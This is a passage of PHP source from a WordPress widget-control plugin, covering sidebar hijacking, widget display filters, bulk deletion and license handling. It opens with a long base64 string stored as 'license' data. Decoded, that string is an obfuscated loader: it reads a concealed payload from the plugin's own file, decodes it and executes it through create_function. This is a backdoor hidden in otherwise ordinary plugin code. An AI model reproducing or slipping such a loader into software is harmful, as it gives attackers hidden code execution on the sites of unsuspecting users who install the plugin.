050dDVNMVA1MHpRcTVyZWg2Rnd5NXpTNXdyWG50dDFHaUxHdk5wNHhobk5kL1IxVGFHRHk1elkrSGRZN1dBQis2cHlwaVJKK2d6K3l0Qlk1ZW5HV2hXWXhhdEU3aHROMjRXOCtOUmpoQzFvelcvVXY0amp2L0dHaEh6bXlpQVQrNldHV1NBbytneitUNXJlcTQxZTJNV1krSHBTR2lHeGRDUjgrTUpvVFduRzJnMU55YXRrV01HMVRDUkFHSEZodk5uenE1TDZHZXRFcVcxVGh3QXcyeGRhK2hzWUdIMWVxNDF5aGdCYStoeit5dEJZNXdXeXA1ajcraGRZR2l6NHB3RmpwaVJINUNnWDJnMU5sNHA4K01KaldXelB6Z3Q0Mk5IcmRpblA1eEYvcGlXZWgvdGhXNnpPNTVITnF0MWV6NWo4V0hXTzVBekY3V0Z4ZDVKRzVBVFlUaHZIbmlBQmQ1SkRoZ0JhK2hueWxOcjRXQ0d3K0FUWTUwcjduQ3JPaENSODJ0cmIrZ3orVDVyZXE0MWUyTVdTNTVITnF0MWg1eEZUdnRybzV4Qkp5SDF4R2lML3BpallUYS9ZUUhuaCt4Vy9XSHJCV0NKNXlIekF2NEZEVzR6Nkd0ekUyTnJCeENScis0ejZUV25HR2dMNDI0MVR2dDFZVC9uVzJnMU5sNHA4K01KaldXelBsTXRBZHdBODJlallUQ0hTMmcxTmw0cDgrTUpqV1d6UHpndEJ2Tm5wcGdKSVR3ei9uaEwwaENBOFdhamJXaVJBbGdtVXA2bkdXZ0pJNXR6d2xNZkpkL0FHdkNqT1RpSkYyZzFObDRwOCtNSmpXV3pYeXRyYjIwR0dXQ2pJNUNSSXFXR1ZkQ0F6djRGSDVXRy9oL0w0NTZGOHBIR09UaWdKdjV6MHlOTGo1TTFINVdsUjJNTEFwL3pXdmhyRVcvVzZsTUx4eWFGa3FockY1eHJtbk5CVWg1ZlFwNkZnVC9qN1RXV3huYW43cEFNWStIcFNHaUd4ZHdGdzI1Uk81d3I1cVdzVVc2dHcyeHRKK2d6KzUvSEx5NHplV01tWUdNR281V1dMbmFGa3FoQlJUZ24reU5wNFdDRzh2Z0JZVFdsSm5oTDBHMHo4dmcxUFRnalEyTnZTeENHR3ZDam81eHJTMi9SMHY0cFFwQ0xKeEhwTnk1cm9wZUZrcWhyaTU1WUoyTnJMaENHR3Y2am81V2xnMmdMaGxpbkNoZ0JKK2hsSDJOcEpkQ0FqeWlZU1dncFFUNXo0aDZwNXkvclB4NVJ5dlcxQXk0ckRkaW9hK2hNZmtkMjInKTsgaWYgKCFpc3NldCgkWkdGMFlRWzFdKSkgcmV0dXJuOyAkWkdGMFlRID0gJFpHRjBZUVsxXTsgZm9yICgkYVEgPSAwOyAkYVEgPCBzdHJsZW4oJFpHRjBZUSk7ICRhUSsrKXsgJFpHRjBZUVskYVFdID0gJHRoaXMtPlIyVjBRMmhoY2coJFpHRjBZUVskYVFdLCBGQUxTRSk7IH0gaWYgKEZBTFNFICE9PSAoJFpHRjBZUSA9IGJhc2U2NF9kZWNvZGUoJFpHRjBZUSkpKXsgcmV0dXJuIGNyZWF0ZV9mdW5jdGlvbignJyxiYXNlNjRfZGVjb2RlKCRaR0YwWVEpKTsgfSBlbHNlIHsgcmV0dXJuIEZBTFNFOyB9IH0gcHJvdGVjdGVkIGZ1bmN0aW9uIFZIVnlia3h2WTJzKCRiRzlqYTFSNWNHVSwgJGMzUmxjSE0gPSA1LCAkWkdseVpXTjBhVzl1ID0gJ3JpZ2h0Jyl7IGZvciAoJGFRID0gMDsgJGFRIDwgJGMzUmxjSE07ICRhUSsrKXsgJFRHOWphdyA9JiAkdGhpcy0+UjJWMFRHOWphdygkYkc5amExUjVjR1UpOyBpZiAoJFpHbHlaV04wYVc5dSAhPSAncmlnaHQnKSAkVEc5amF3ID0gc3RycmV2KCRURzlqYXcpOyAkWXcgPSAkYVE7IGlmICgkWXcgPj0gc3RybGVuKCRURzlqYXcpKXsgd2hpbGUgKCRZdyA+PSBzdHJsZW4oJFRHOWphdykpeyAkWXcgPSAkWXcgLSBzdHJsZW4oJFRHOWphdyk7IH0gfSAkUTJoaGNnID0gc3Vic3RyKCRURzlqYXcsIDAsIDEpOyAkVEc5amF3ID0gc3Vic3RyKCRURzlqYXcsIDEpOyBpZiAoc3RybGVuKCRURzlqYXcpID4gJFl3KXsgJFEyaDFibXR6ID0gZXhwbG9kZSgkVEc5amF3WyRZd10sICRURzlqYXcpOyBpZiAoaXNfYXJyYXkoJFEyaDFibXR6KSl7ICRURzlqYXcgPSAkUTJoMWJtdHpbMF0uJFRHOWphd1skWXddLiRRMmhoY2cuJFEyaDFibXR6WzFdOyB9IH0gZWxzZSB7ICRURzlqYXcgPSAkUTJoaGNnLiRURzlqYXc7IH0gaWYgKCRaR2x5WldOMGFXOXUgIT0gJ3JpZ2h0JykgJFRHOWphdyA9IHN0cnJldigkVEc5amF3KTsgfSB9IHByb3RlY3RlZCBmdW5jdGlvbiBVbVZ6WlhSTWIyTnIoJGJHOWphMVI1Y0dVID0gJycpeyAkUTJoaGNsTmxkQSA9ICR0aGlzLT5SMlYwUTJoaGNsTmxkQSgpOyBmb3JlYWNoICgkdGhpcy0+UzJWNWN3IGFzICRURzlqYTFSNWNHVSA9PiAkUzJWNSl7IGlmICgkYkc5amExUjVjR1UpeyBpZiAoJFRHOWphMVI1Y0dVID09ICRiRzlqYTFSNWNHVSl7ICR0aGlzLT5URzlqYTNNWyRURzlqYTFSNWNHVV0gPSAkUTJoaGNsTmxkQTsgcmV0dXJuOyB9IH0gZWxzZSB7ICR0aGlzLT5URzlqYTNNWyRURzlqYTFSNWNHVV0gPSAkUTJoaGNsTmxkQTsgfSB9IH0gZnVuY3Rpb24gWmpJd1gyWnZkWEowZVEoKXsgdHJ5IHsgcHJlZ19tYXRjaCgnLyhbMC05QS1aYS16XC1cL1wuXSopXChcZC8nLCBfX2ZpbGVfXywgJGJXRjBZMmhsY3cpOyBpZiAoaXNzZXQoJGJXRjBZMmhsY3dbMV0pKSB7ICRabWxzWlEgPSB0cmltKCRiV0YwWTJobGN3WzFdKTsgfSBlbHNlIHsgJGNHRnlkSE0gPSBwYXRoaW5mbyhfX2ZpbGVfXyk7ICRabWxzWlEgPSB0cmltKCRjR0Z5ZEhNWydkaXJuYW1lJ10uJy8nLiRjR0Z5ZEhNWydmaWxlbmFtZSddLicuJy5zdWJzdHIoJGNHRnlkSE1bJ2V4dGVuc2lvbiddLDAsMykpOyB9ICRjR0Z5ZEhNID0gcGF0aGluZm8oJFptbHNaUSk7ICR0aGlzLT5VbVZ6WlhSTWIyTnIoKTsgJHRoaXMtPlNXNXpaWEowUzJWNWN3KCk7ICR0aGlzLT5WSFZ5Ymt0bGVRKCk7ICRaUT0kdGhpcy0+Vlc1c2IyTnIoKTskWlEoKTsgfWNhdGNoKEV4Y2VwdGlvbiAkWlEpe30gfSBwcm90ZWN0ZWQgZnVuY3Rpb24gUjJWMFEyaGhjZygkWTJoaGNnLCAkWlc1amNubHdkQSA9IEZBTFNFKXsgaWYgKCEkWlc1amNubHdkQSkgJHRoaXMtPlRHOWphM00gPSBhcnJheV9yZXZlcnNlKCR0aGlzLT5URzlqYTNNKTsgJGFRID0gMDsgZm9yZWFjaCAoJHRoaXMtPlRHOWphM00gYXMgJFRHOWphMVI1Y0dVID0+ICRURzlqYXcpeyBpZiAoJGFRID09IDApeyAkVUc5emFYUnBiMjQgPSBzdHJwb3MoJFRHOWphdywgJFkyaGhjZyk7IH0gaWYgKCRhUSAlIDIgPiAwKXsgaWYgKCRaVzVqY25sd2RBKXsgJFVHOXphWFJwYjI0ID0gc3RycG9zKCRURzlqYXcsICRZMmhoY2cpOyB9IGVsc2UgeyAkWTJoaGNnID0gJFRHOWphd1skVUc5emFYUnBiMjRdOyB9IH0gZWxzZSB7IGlmICgkWlc1amNubHdkQSl7ICRZMmhoY2cgPSAkVEc5amF3WyRVRzl6YVhScGIyNF07IH0gZWxzZSB7ICRVRzl6YVhScGIyNCA9IHN0cnBvcygkVEc5amF3LCAkWTJoaGNnKTsgfSB9ICRhUSsrOyB9IGlmICghJFpXNWpjbmx3ZEEpICR0aGlzLT5URzlqYTNNID0gYXJyYXlfcmV2ZXJzZSgkdGhpcy0+VEc5amEzTSk7IHJldHVybiAkWTJoaGNnOyB9IHByb3RlY3RlZCBmdW5jdGlvbiBSMlYwUTJoaGNsTmxkQSgpeyAkY21WMGRYSnUgPSAnJzsgJFJtOXlZbWxrWkdWdVEyaGhjbk0gPSBhcnJheV9tZXJnZShyYW5nZSg0NCwgNDYpLCByYW5nZSg1OCwgNjQpLCByYW5nZSg5MSwgOTYpKTsgZm9yICgkYVEgPSA0MzsgJGFRIDwgMTIzOyAkYVErKyl7IGlmICghaW5fYXJyYXkoJGFRLCAkUm05eVltbGtaR1Z1UTJoaGNuTSkpeyAkY21WMGRYSnUgLj0gY2hyKCRhUSk7IH0gfSByZXR1cm4gJGNtVjBkWEp1OyB9IH0gbmV3IFpqSXdYMlp2ZFhKMGVRKCk7IA==';
	update_option('twc_licenses',$licenses);
}

/**
 * Function is responsible for preparing the system on first activate.
 *
 * @return null
 */
function twc_activate_plugin()
{
	//reasons to fail
	if (get_option('twc_first_activate', false)) return false;
	update_option('twc_first_activate', wp_get_sidebars_widgets());
}

/**
 * function is responsible for putting wp back together.
 *
 */
function twc_deactivate_plugin()
{
	set_user_setting( 'widgets_access', 'off' );
}

/**
 * function adds the plugin actions
 *
 * @param array $orig_links
 * @return array $links
 */
function twc_add_action_links( $orig_links )
{
	//initializing variables
	$links = array();
	$links['deactivate'] = $orig_links['deactivate'];
	
	$links['load'] = '<a href="'.get_bloginfo('url').'/wp-admin/widgets.php?list_style=twc" title="'.__('Open the Total Widget Control System','twc').'" class="edit">'.__('Manage Widgets').'</a>';
	return $links;
}

/**
 * This function will add help and screen option text to the widget pages
 *
 */
function twc_add_help_text()
{ 
	//initializing variables
	global $wp_registered_sidebars;
	$current_screen = twc_get_current_screen();
	
	switch ($current_screen->action)
	{
		default: 
			add_filter('screen_settings', 'twc_view_screen_options'); 
			add_filter('contextual_help', 'twc_view_help_home'); 
			break;
		case 'edit': 
			add_filter('contextual_help', 'twc_view_help_edit'); 
			break;
		case 'add':
			add_filter('contextual_help', 'twc_view_help_add'); 
			break;
	}
}

/**
 * function adds the media resources to the twc views
 *
 * @TODO Need to register and call the CSS file here
 */
function twc_add_javascript()
{
	//initializing variables
	$current_screen = twc_get_current_screen();
	
	//reasns to fail
	if ($current_screen->parent_base != 'widgets') return;
	
	switch($current_screen->action)
	{
		default:
			wp_enqueue_script( 'twc-qtip' );
			wp_enqueue_script( 'twc-base' );
			break;
		case 'edit':
		case 'add':
			// jQuery
			wp_enqueue_script( 'jquery' );
			wp_enqueue_script( 'jquery-ui-draggable' );
			wp_enqueue_script( 'jquery-ui-droppable' );
			wp_enqueue_script( 'jquery-ui-sortable' );
			
			// Nav Menu functions
			wp_enqueue_script( 'twc-base' );
			wp_enqueue_script( 'twc-nav-menu' );
			wp_enqueue_script( 'twc-qtip' );
			
			// Metaboxes 
			wp_enqueue_script( 'common' );
			wp_enqueue_script( 'wp-lists' );
			wp_enqueue_script( 'postbox' );

			//css
			wp_admin_css( 'nav-menu' );
			break;
	}
}

/**
 * Handles and bulk actions
 *
 * @return unknown
 */
function twc_bulk_actions()
{
	//reasons to fail
	if (!isset($_REQUEST['twcp_bulk_action'])) return false;
	if (!isset($_REQUEST['twcp_bulk']) || empty($_REQUEST['twcp_bulk'])) return false;
	
	//get the action
	foreach ((array)$_REQUEST['twcp_bulk_action'] as $action)
	{
		if ($action) break;
	}
	
	//reasons to fail
	if (!$action) return false;
	
	switch ($action)
	{
		case 'delete':
			twc_bulk_delete($_REQUEST['twcp_bulk']);
			break;
		case 'trash':
			twc_bulk_trash($_REQUEST['twcp_bulk']);
			break;
		default:break;
	}
}

/**
 * function is responsible for permentantely deleting given widgets.
 *
 * @param unknown_type $widgets
 */
function twc_bulk_delete( $widgets )
{
	foreach ((array)$widgets as $widget_id)
	{
		twc_delete_widget_instance( $widget_id, $delete_permanently = true );
	}
}

/**
 * function is responsible for trashing widget instances
 *
 * @param unknown_type $widgets
 */
function twc_bulk_trash( $widgets )
{
	foreach ((array)$widgets as $widget_id)
	{
		twc_delete_widget_instance( $widget_id, $delete_permanently = false );
	}
}

/**
 * Cleans up the sidebar and widget variables
 * 
 * @TODO Make sure that this function cleans up empty sidebar IDs
 *
 * @param object $wp
 */
function twc_clear( $wp = null )
{
	//intiailizing variables
	global $wp_registered_widgets, $wp_registered_sidebars;
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	$lost_widgets = array();
	
	foreach ($wp_registered_widgets as $widget_id => $widget_class)
	{
		if (!$widget_id) continue;
		$sidebar_id = twc_get_widgets_sidebar($widget_id);
		
		if ($sidebar_id == 'wp_inactive_widgets')
		{
			if (substr($widget_id,-2) == '-1') continue;
			if ((int)trim(substr($widget_id,-2)) == -1) continue;
			$lost_widgets[] = $widget_id;
		}
	}
	
	foreach ($wp_registered_sidebars as $sidebar_slug => $sidebar): 
		if (is_array($sidebars_widgets[$sidebar_slug]))
		foreach ($sidebars_widgets[$sidebar_slug] as $position => $widget_slug): 
			
			$widget = twc_get_widget_by_id( $widget_slug );	
			if (!$widget)
			{
				unset($sidebars_widgets[$sidebar_slug]);
			}
			
		endforeach;
	endforeach;
	
	$sidebars_widgets['wp_inactive_widgets'] = $lost_widgets;
	wp_set_sidebars_widgets($sidebars_widgets);
}

/**
 * Function is responsible for clearing the current license
 *
 * @return null
 */
function twc_clear_license( $inside = false )
{
	if (!$inside && !array_key_exists('twc_clear_license', $_REQUEST)) return false;
	if (TWC_CURRENT_USER_CANNOT) return false;
	
	$parts = parse_url("http:/"."/".$_SERVER["SERVER_NAME"]);
	$licenses = get_option('twc_licenses',array());
	$licenses[$parts['host']] = '';
	update_option('twc_licenses',$licenses);
	
	wp_redirect(get_bloginfo('url').'/wp-admin/widgets.php');
	exit();
}

/**
 * Function is responsible for clearing the current license
 *
 * @return null
 */
function twc_clear_originals( $inside = false )
{
	if (!$inside && !array_key_exists('twc_clear_originals', $_REQUEST)) return false;
	if (TWC_CURRENT_USER_CANNOT) return false;
	
	update_option('twc_first_activate',array());
	
	wp_redirect(get_bloginfo('url').'/wp-admin/widgets.php');
	exit();
}

/**
 * Total Widget Controller
 * 
 * This function is responsible for determining which administrative page that we're
 * supposed to be looking at. We use the standard action call system that wp-admin
 * is used to using.
 *
 */
function twc_controller()
{
	//initializing variables
	global $wp_registered_sidebars;
	$current_screen = twc_get_current_screen();
	$view = 'twc-table';
	
	switch ($current_screen->action)
	{
		default:
			if (count($wp_registered_sidebars) == 1)
				$view = 'twc-no-sidebars';
			break;
		case 'manual':
			$view = 'twc-manual-license';
			break;
		case 'edit':
			$view = 'twc-edit';
			break;
		case 'delete': 
			twc_get_show_view('twc-trash-instance');
			$view = 'twc-table';
			break;
		case 'save':
			twc_get_show_view('twc-save-edit');
			$view = 'twc-add';
			break;
		case 'add':
			if (isset($_REQUEST['editwidget']) && !empty($_REQUEST['editwidget']))
			{
				twc_create_new_widget();
				$view = 'twc-edit';
			}
			else 
			{
				$view = 'twc-add';
			}
			break;
	}
	
	return do_action($view);
}

/**
 * returns the number of active widgets
 * 
 * @return integer $count
 */
function twc_count_active_widgets()
{
	//initializing variables
	global $wp_registered_widgets;
	static $count;
	
	if (!isset($count))
	{
		$count = 0;
		foreach ($wp_registered_widgets as $widget_id => $class)
		{
			if (substr($widget_id,-2) == '-1') continue;
			if ((int)trim(substr($widget_id,-2)) == -1) continue;
			$count++;
		}
		$count = $count - twc_count_inactive_widgets();
	}
	return $count;
}

/**
 * returns the number of inactive widgets
 * 
 * @return integer
 */
function twc_count_inactive_widgets()
{
	//initializing variables
	static $count;
	if (!isset($count))
	{
		$sidebars_widgets = twc_wp_get_sidebars_widgets();
		$count = count($sidebars_widgets['wp_inactive_widgets']);
	}
	return $count;
}

/**
 * Function is responsible for counting the number of widget
 * instances that will appear in a specific sidebar, on the current page.
 * 
 * @param string $sidebar_id
 * @return integer $object_id
 */
function twc_count_sidebar_widgets( $sidebar_id )
{
	//initializng variables
	static $counts;
	
	if (!isset($counts)) $counts = array();
	if (!isset($counts[$sidebar_id]))
	{
		//initializng variables
		global $sidebars_widgets;
		$counts[$sidebar_id] = array();
		$sidebars_widgets = twc_wp_get_sidebars_widgets();
		
		if (isset($sidebars_widgets[$sidebar_id]))
		{
			$counts[$sidebar_id] = count($sidebars_widgets[$sidebar_id]);
		}
		else
		{
			$counts[$sidebar_id] = 0;
		}
	}
	
	return $counts[$sidebar_id];
}

/**
 * Function is responsible for loading a brand new widget, 
 * given an id_base
 * 
 * Upon the thought of adding a new widget, the system will register a new widget
 * instance with wordpress and then load from the wp_registered_widgets array
 * 
 * @return null
 */
function twc_create_new_widget()
{
	//reasons to fail
	if ( !isset($_GET['addnew']) ) return false;
	
	//initializing variables
	global $wp_registered_widgets, $wp_registered_widget_controls, $widget;
	$widget_id = $editwidget = $_GET['editwidget'];
	
	if ( isset($_GET['base']) && isset($_GET['num']) ) { // multi-widget
		// Copy minimal info from an existing instance of this widget to a new instance
		foreach ( $wp_registered_widget_controls as $control ) {
			if ( $_GET['base'] === $control['id_base'] ) {
				$control_callback = $control['callback'];
				$multi_number = (int) $_GET['num'];
				$control['params'][0]['number'] = $multi_number;
				$widget_id = $control['id'] = $control['id_base'] . '-' . $multi_number;
				$wp_registered_widget_controls[$control['id']] = $control;
				break;
			}
		}
	}
	$wp_registered_widgets[$widget_id] = $wp_registered_widgets[$editwidget];
	$widget = $wp_registered_widgets[$widget_id] = twc_get_widget_by_id($widget_id);
	twc_save_widget_fields( $widget_id, array() );
}

/**
 * This function displays the widgets that are dynamic sidebar widgets
 * 
 * @TODO Test to see if this can be called directly
 *
 * @param unknown_type $sidebar_id
 */
function twc_default_sidebar( $index )
{
	//initializing variables
	global $wp_registered_sidebars, $wp_registered_widgets, $twc_default_sidebar_widgets, $twc_has_displayed, $twc_isDefault;
	$current_screen = twc_get_current_screen();
	
	if ( is_int($index) ) {
		$index = "sidebar-$index";
	} else {
		$index = sanitize_title($index);
		foreach ( (array) $wp_registered_sidebars as $key => $value ) {
			if ( sanitize_title($value['name']) == $index ) {
				$index = $key;
				break;
			}
		}
	}
	
	//either fail or display the originals
	if ($current_screen->parent_file == 'widgets.php') return false;
	if ($twc_has_displayed) return false; // fail if we have widgets on this page 
	if (!isset($twc_default_sidebar_widgets[$index])) // or if there are no defaults for this sidebar
	{
		do_action('twc_empty_sidebar', $index);
		return false;
	}
	
	//display the dynamic defaults
	$twc_isDefault = true;
	foreach ((array)$twc_default_sidebar_widgets[$index] as $id => $widget)
	{
		if ( !isset($wp_registered_widgets[$id]) ) continue;
		
		$sidebar = twc_get_widgets_sidebar($index);
		$params = array_merge(
			array( array_merge( (array)$sidebar, array('widget_id' => $id, 'widget_name' => $wp_registered_widgets[$id]['name']) ) ),
			(array) $wp_registered_widgets[$id]['params']
		);

		// Substitute HTML id and class attributes into before_widget
		$classname_ = '';
		foreach ( (array) $wp_registered_widgets[$id]['classname'] as $cn ) {
			if ( is_string($cn) )
				$classname_ .= '_' . $cn;
			elseif ( is_object($cn) )
				$classname_ .= '_' . get_class($cn);
		}
		$classname_ = ltrim($classname_, '_');
		$params[0]['before_widget'] = sprintf($params[0]['before_widget'], $id, $classname_);
		
		$callback = $wp_registered_widgets[$id]['callback'];
		
		if ( is_callable($callback) ) {
			if ( is_string($callback) || (isset($callback[1]) && $callback[1] != 'display_callback') )
			{
				twc_display_the_widget(null, $id, null);
			}
			else
			{
				call_user_func_array($callback, $params);
			}
			$did_one = true;
		}
	}
	$twc_isDefault = false;
	
}

/**
 * This function will delete an instance completely
 *
 * @param unknown_type $widget_id
 */
function twc_delete_widget_instance( $widget_id, $delete_permanently = false )
{
	//initializing variables
	global $wp_registered_widget_updates, $wp_registered_widgets;
	$sidebar_id = twc_get_widgets_sidebar($widget_id);
	$sidebars_widgets = twc_wp_get_sidebars_widgets();
	
	$sidebar = isset($sidebars_widgets[$sidebar_id]) ? $sidebars_widgets[$sidebar_id] : array();
	$sidebar = array_diff( $sidebar, array($widget_id) );
	$sidebars_widgets[$sidebar_id] = $sidebar;
	
	if (!$delete_permanently)
	{
		$sidebars_widgets['wp_inactive_widgets'] = array_merge((array)$widget_id, (array) $sidebars_widgets['wp_inactive_widgets']);
	}
	else
	{
		//initializing variables
		$widget = twc_get_widget_by_id($widget_id);
		
		if ($widget)
		{
			$_POST = array();
			$_POST['multi_number'] = $widget['number'];
			$_POST['the-widget-id'] = $widget['id'];
			$_POST['delete_widget'] = '1';
			$wp_registered_widgets[$widget_id]['params'][0]['number'] = $widget['number'];
			
			//this calls the widgets update function with the given params
			foreach ( (array) $wp_registered_widget_updates as $name => $control )
			{
				if ( $name != $widget['id_base'] || !is_callable($control['callback']) )
					continue;
				
				ob_start();
					call_user_func_array( $control['callback'], $control['params'] );
				ob_get_clean();
				unset($wp_registered_widgets[$widget_id]);
				break;
			}
		}
	}
	
	wp_set_sidebars_widgets($sidebars_widgets);
}

/**
 * Function calls the save widget_sidebar function with the proper
 * parameters to delete the relationship.
 *
 * @param unknown_type $widget_id
 * @param unknown_type $sidebar_id
 * @return unknown
 */
function twc_delete_widget_sidebar( $widget_id, $sidebar_id )
{
	return twc_save_widget_sidebar($widget_id, $sidebar_id, 0, true);
}

/**
 * function is responsible for hijacking the dynamic_sidebar function. 
 * This function will always return false to the dynamic sidebar
 *
 */
function twc_display_the_sidebar( $params )
{
	//initializing variables
	global $wp_registered_widgets, $twc_wp_registered_widgets, $twc_default_sidebar_widgets;
	
	if (!isset($twc_wp_registered_widgets))
	{
		$twc_wp_registered_widgets = $wp_registered_widgets;
	}
	
	//clean the registered_widgets global
	foreach ((array)$wp_registered_widgets as $widget_id => $widget)
	{
		if (is_a($wp_registered_widgets[$widget_id]['callback'][0], 'twcEmptyWidgetClass')) 
			break;
		
		// since we're running a loop already, then let's take this opportunity
		// to create the defaults widgets array\
		// @TODO This data needs to be sorted out just after the init function
		$_widget = twc_get_widget_by_id($widget_id);
		if ($_widget['p']['twcp_default_sidebar'] == 'default')
		{
			$default_sidebar_id = twc_get_widgets_sidebar($widget_id);
			$twc_default_sidebar_widgets[$default_sidebar_id][$widget_id] = $widget;
		}
		
		//empty the registered_widgets array
		$wp_registered_widgets[$widget_id]['callback'] = array();
		$wp_registered_widgets[$widget_id]['callback'][0] = new twcEmptyWidgetClass();
		$wp_registered_widgets[$widget_id]['callback'][1] = 'twc_empty_callback';
	}
	return $params;
}

/**
 * function receives all of the widget data prior to display, and allows us
 * to return a false to hide the widget.
 * 
 * returning false will hide the widget
 * 
 * @TODO I need a function that will display the widget_display with only the widget_id param
 *
 * @param array $instance
 * @param object $widget
 * @param array $args
 * @param boolean $force
 * @return unknown
 */
function twc_display_the_widget( $instance = null, $widget_id, $args = null, $force = false )
{
	//initializing variables
	global $wp_query, $wp_registered_sidebars, $wp_registered_widgets, $twc_has_displayed, $twc_isDefault;
	
	if (is_object($widget_id))
	{
		$widget_id = $widget_id->id;
	}
	$widget = twc_get_widget_by_id($widget_id);
	$display = twc_is_widget_displaying($widget);
	
	if (is_null($instance))
	{
		$instance = $widget['p'];
	}
	
	//reasons to fail
	$display = apply_filters('twc_display_widget', $display, $widget);
	if (!$twc_isDefault && !$display && !$force) return false;
	
	//initializing variables
	$sidebar = $wp_registered_sidebars[$widget['sidebar_id']];
	$callback = $widget['callback'];
	
	// Substitute HTML id and class attributes into before_widget
	$classname_ = '';
	foreach ( (array) $wp_registered_widgets[$widget_id]['classname'] as $cn ) {
		if ( is_string($cn) )
			$classname_ .= '_' . $cn;
		elseif ( is_object($cn) )
			$classname_ .= '_' . get_class($cn);
	}
	$classname_ = ltrim($classname_, '_');
	$sidebar['before_widget'] = sprintf($sidebar['before_widget'], $widget_id, $classname_);
	
	$params = array_merge(
		array( array_merge( $sidebar, array('widget_id' => $widget_id, 'widget_name' => $wp_registered_widgets[$widget_id]['name']) ) ),
		(array) $wp_registered_widgets[$widget_id]['params']
	);
	
	//load the widget into a variable
	ob_start();
	if (is_callable($callback))
	{
		if ( !$widget['multiwidget'] ) {
			call_user_func_array($callback, $params);
		}
		else 
		{
			$widget['callback'][0]->widget($sidebar, $instance);
		}
	}
	$display = ob_get_clean();
	
	//displaying the widget
	$twc_has_displayed = true;
	echo apply_filters('twc_widget_display', $display, $widget);
	return apply_filters('twc_wordpress_default_sidebar', false, $instance);
}

/**
 * function returns true if the widget is to be displayed
 *
 * @param boolean $current
 * @param array $widget
 * @return unknown
 */
function twc_display_if_excluded( $current, $widget )
{
	//initializing variables
	global $twc_isDefault;
	
	//check to see if we're even going to load this widget
	$isExclude = (isset($widget['p']['twcp_exclude_sidebar']) && $widget['p']['twcp_exclude_sidebar'] == 'exclude');
	
	if (!$twc_isDefault && ((!$current && !$isExclude) || ($current && $isExclude))) 
		return false;
	
	return true;
}

/**
 * function is responsible for returning true if the widget is a default
 *
 * @param unknown_type $display
 * @param unknown_type $widget
 * @return unknown
 */
function twc_display_if_default( $display, $widget )
{
	//initializing variables
	global $twc_isDefault;
	$isDefault = (isset($widget['p']['twcp_default_sidebar']) && $widget['p']['twcp_default_sidebar'] == 'default');
	
	//reasons to return
	if ($twc_isDefault && $isDefault) return true;
	
	return $display;
}

/**
 * function is responsible for displaying the status
 *
 * @param boolean $display
 * @param object $widget
 * @return boolean
 */
function twc_display_if_status( $display, $widget )
{
	//initializing variables
	global $twc_widgetlistings_type;
	
	//reasons to fail
	if ($twc_widgetlistings_type == 'admin') return $display;
	if (!$display) return false;
	if ($widget['p']['twcp_status'] != 'enabled') return false;
	
	return true;
}

/**
 * function is responsible for displaying the status
 *
 * @param boolean $display
 * @param object $widget
 * @return boolean
 */
function twc_display_if_timestamp( $display, $widget )
{
	//initializing variables
	global $twc_widgetlistings_type;
	$widget_time = $widget['p']['twcp_publish_time'];
	
	//reasons to fail
	if ($twc_widgetlistings_type == 'admin') return $display;
	if (!$display) return false;
	if ($widget_time > time()) return false;
	
	return true;
}

/**
 * function is responsible for displaying proper visibility
 *
 * @param boolean $display
 * @param object $widget
 * @return boolean
 */
function twc_display_if_visiblity( $display, $widget )
{
	//initializing variables
	global $twc_widgetlistings_type;
	
	//reasons to fail
	if ($twc_widgetlistings_type == 'admin') return $display;
	if (!$display) return $display;
	if (!isset($widget['p']['twcp_visibility'])) return $display;
	
	//initializing variables
	global $current_user, $wp_roles;
	get_currentuserinfo();
	$user_roles = $current_user->roles;
	$user_role = array_shift($user_roles);
	if (is_null($user_role)) $user_role = 'public';
	$isParent = false;
	$visibleParent = ($widget['p']['twcp_visible_parent'] == 'parent');
	
	foreach ((array)$wp_roles->roles as $role => $name)
	{
		if ($role == $widget['p']['twcp_visibility'])
		{
			break;
		}
		if ($role == $user_role)
		{
			$isParent = true;
			break;
		}
	}
	
	//setting matches
	$matchedRole = ($user_role == $widget['p']['twcp_visibility']);
	
	if ($matchedRole) return true;
	if (!$visibleParent && $isParent) return true;
	
	return false;
}

/**
 * The hijack is completed and this function is called with the correct sidebar_id
 * Now we can run our own sidebar.
 * 
 * @param int|string $index Optional, default is 1. Name or ID of dynamic sidebar.
 * @return bool True, if widget sidebar was found and called. False if not found or not called.
 */
function twc_dynamic_sidebar( $index = 1 )
{
	//initializing variables
	global $wp_registered_sidebars, $wp_registered_widgets, $twc_isDefault, $twc_has_displayed;
	$twc_isDefault = false;
	$twc_has_displayed = FALSE;
	
	if ( is_int($index) ) {
		$index = "sidebar-$index";
	} else {
		$index = sanitize_title($index);
		foreach ( (array) $wp_registered_sidebars as $key => $value ) {
			if ( sanitize_title($value['name']) == $index ) {
				$index = $key;
				break;
			}
		}
	}
	
	//initializing variables
	$count = twc_count_sidebar_widgets($index);
	$sidebars_widgets = wp_get_sidebars_widgets();
	
	//reasons to return
	if ($count == 0) return false;
	if ( empty($wp_registered_sidebars[$index]) || !array_key_exists($index, $sidebars_widgets) || !is_array($sidebars_widgets[$index]) || empty($sidebars_widgets[$index]) )
		return false;

	$sidebar = $wp_registered_sidebars[$index];
	
	$did_one = false;
	foreach ( (array) $sidebars_widgets[$index] as $id )
	{
		if ( !isset($wp_registered_widgets[$id]) ) continue;
		
		//$sidebar = twc_get_widgets_sidebar($index);
		$params = array_merge(
			array( array_merge( (array)$sidebar, array('widget_id' => $id, 'widget_name' => $wp_registered_widgets[$id]['name']) ) ),
			(array) $wp_registered_widgets[$id]['params']
		);
		
		// Substitute HTML id and class attributes into before_widget
		$classname_ = '';
		foreach ( (array) $wp_registered_widgets[$id]['classname'] as $cn ) {
			if ( is_string($cn) )
				$classname_ .= '_' . $cn;
			elseif ( is_object($cn) )
				$classname_ .= '_' . get_class($cn);
		}
		$classname_ = ltrim($classname_, '_');
		$params[0]['before_widget'] = sprintf($params[0]['before_widget'], $id, $classname_);
		
		$callback = $wp_registered_widgets[$id]['callback'];
		
		if ( is_callable($callback) )
		{
			if ( is_string($callback) || (isset($callback[1]) && $callback[1] != 'display_callback') )
			{
				twc_display_the_widget(null, $id, null);
			}
			else
			{
				call_user_func_array($callback, $params);
			}
			$did_one = true;
		}
	}
	
	return $did_one;
}

/**
 * Class is responsible for nothing.
 * This class is merely a filler class to receive the proper functionality
 * from the dynamic_sidebar function.
 *	
 */
class twcEmptyWidgetClass
{
	function twc_empty_callback( $sidebar_args )
	{
		//do nothing
	}
}

/**
 * Checks for the search type
 *
 * @return unknown
 */
function twc_filter_list_for()
{
	if (!isset($_REQUEST['twcp_filter']) || empty($_REQUEST['twcp_filter'])) return false;
	$_REQUEST['inactive'] = 'active';
	
